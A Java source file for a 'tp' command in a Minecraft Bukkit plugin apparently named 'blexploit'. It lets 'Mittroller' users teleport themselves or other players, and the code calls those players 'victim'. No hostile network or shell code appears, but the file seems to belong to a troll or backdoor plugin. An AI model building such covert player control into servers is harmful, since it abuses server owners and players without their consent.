package de.blexploit.command.cmds;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import api.Fehler;
import de.blexploit.Start;
import de.blexploit.command.Command;
import de.blexploit.manager.TabManager;
import de.blexploit.players.create.MittrollerEntity;

public final class Tp extends Command {

	public Tp() {
		super("tp", "Teleportiere Spieler", TabManager.INSERT_PLAYERNAME, TabManager.INSERT_PLAYERNAME);
	}

	@Override
	public void run(final String[] args, final MittrollerEntity mt) {
		if (args.length < 2 || args.length > 3) {
			mt.fehler(Fehler.ARGUMENT_EXCEPTION);
			mt.benutze(this);
			return;
		}
		final Player victim = api.Get.victim(args, 1);
		final Player victim2;
		if (victim == null) {
			mt.fehler(Fehler.PLAYER_NOT_FOUND);
			mt.benutze(this);
			return;
		}
		if (args.length == 3) {
			victim2 = api.Get.victim(args, 2);
		} else {
			victim2 = null;
		}
		Bukkit.getScheduler().runTask(Start.instance, new Runnable() {
			@Override
			public void run() {
				try {
					if (args.length == 2) {
						mt.getPlayer().teleport(victim);
						mt.sendMessage("Erfolgreich zu §c" + victim.getName() + "§a teleportiert.");
					} else {
						if (victim2 != null) {
							victim.teleport(victim2);
							mt.sendMessage("Erfolgreich §c" + victim.getName() + " §azu " + ChatColor.YELLOW
									+ victim2.getName() + "§a teleportiert.");
						} else {
							mt.fehler(Fehler.PLAYER_NOT_FOUND);
						}
					}
				} catch (Exception e) {
					mt.fehler(Fehler.UNKNOWN_EXCEPTION);
				}
			}
		});
	}

}
